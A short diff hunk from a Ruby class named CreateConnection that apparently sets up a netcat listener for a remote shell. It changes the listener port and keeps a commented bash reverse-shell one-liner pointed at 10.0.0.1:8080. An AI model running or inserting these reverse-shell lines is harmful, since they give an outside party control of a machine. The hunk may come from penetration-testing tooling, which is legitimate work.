@@ -23,9 +23,7 @@ class CreateConnection < CoreScript
     return unless needed_commands(shell, pp)
     #/MANDATORY
 
-    remote_shell = ShellProcess.new("nc -l 4446", pp)
-    
-    #bash -i >& /dev/tcp/localhost/4445 0>&1
+    remote_shell = ShellProcess.new("nc -l 4445", pp)
     
     #bash
     #bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
